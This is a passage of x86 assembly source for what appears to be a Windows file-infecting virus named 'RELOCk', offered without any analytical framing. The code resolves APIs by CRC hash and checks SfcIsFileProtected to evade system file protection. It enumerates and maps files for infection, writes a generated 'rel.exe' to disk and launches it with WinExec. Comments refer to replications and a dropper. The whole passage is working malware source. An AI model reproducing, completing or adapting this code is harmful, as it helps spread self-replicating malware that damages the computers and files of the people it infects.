        stos    word ptr [edi]
        sub     byte ptr [esi + edx + 1], 0c0h
        push    edx
        inc     edx

mips32_carry    label   near
        inc     edx
        db      0d6h
        sbb     byte ptr [esi + edx], cl
        lahf
        sub     byte ptr [ebx + edx], al
        sahf
        jb      mips32_carry
        pop     edx

skip_mips32     label   near
        call    random
        and     al, 1
        je      skip_mips64
        and     dl, 0f0h
        cmp     edx, offset relock_codeend - offset relock_inf - 0fh
        jnb     skip_mips64
        cmp     byte ptr [esi + edx + 0dh], 60h
        jb      skip_mips64
        mov     ecx, dword ptr [ebx + edx + 5]
        or      cx, word ptr [ebx + edx + 9]
        or      ecx, dword ptr [ebx + edx + 0ch]
        inc     ecx
        loop    skip_mips64
        mov     eax, edx
        add     ah, 90h
        stos    word ptr [edi]
        sub     byte ptr [esi + edx + 0dh], 60h
        push    edx
        lea     edx, dword ptr [edx + 0dh]

mips64_carry    label   near
        inc     edx
        db      0d6h
        sbb     byte ptr [esi + edx], cl
        lahf
        sub     byte ptr [ebx + edx], al
        sahf
        jb      mips64_carry
        pop     edx

skip_mips64     label   near
        pop     eax
        cmp     eax, offset relock_codeend - offset relock_inf
        jne     get_codebits
        xor     al, al
        stos    byte ptr [edi]
        lea     ebx, dword ptr [esp + ((statelen + 1) shl 2) + 10h]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        pop     esi
        push    esi
        push    eax
        push    eax
        push    CREATE_ALWAYS
        push    eax
        push    eax
        push    GENERIC_WRITE
        call    skip_name
        db      "rel.exe", 0

skip_name       label   near
        pop     ebp
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dCreateFileA]
        push    eax
        push    eax
        push    esp
        sub     edi, esi
        push    edi
        push    esi
        push    eax
        lea     eax, dword ptr [edi + 6fffh]
        and     eax, not 0fffh
        mov     dword ptr [esi + 5ch], eax
        dec     edi
        mov     dword ptr [esi + 0c8h], edi
        sub     edi, 0deh
        mov     dword ptr [esi + 0b0h], edi
        mov     dword ptr [esi + 0e2h], edi
        call    dword ptr [ebx + dllcrcstk.dWriteFile]
        call    dword ptr [ebx + dllcrcstk.dCloseHandle]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]
        push    eax
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dWinExec]
        lea     esp, dword ptr [ebx + size dllcrcstk]
        popad
        ret

relock_codeend  label   near
        db      0ffh                            ;dummy byte to protect against carry overflow
relock_execode  endp
relock_inf      endp

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileW"         , 0
                db      "FindClose"           , 0
                db      "FindFirstFileW"      , 0
                db      "FindNextFileW"       , 0
                db      "GetFullPathNameW"    , 0
                db      "GetTickCount"        , 0
                db      "GlobalAlloc"         , 0
                db      "GlobalFree"          , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "MultiByteToWideChar" , 0
                db      "SetCurrentDirectoryA", 0
                db      "SetCurrentDirectoryW", 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileTime"         , 0
                db      "Sleep"               , 0
                db      "UnmapViewOfFile"     , 0

sfcnames        db      "SfcIsFileProtected", 0

dllnames        db      "CloseHandle"        , 0
                db      "CreateFileA"        , 0
                db      "GetTickCount"       , 0
                db      "GlobalAlloc"        , 0
                db      "GlobalFree"         , 0
                db      "WinExec"            , 0
                db      "WriteFile"          , 0

txttitle        db      "RELOCk", 0
txtbody         db      "running...", 0

.code
                db      4000h dup (?)
end             dropper
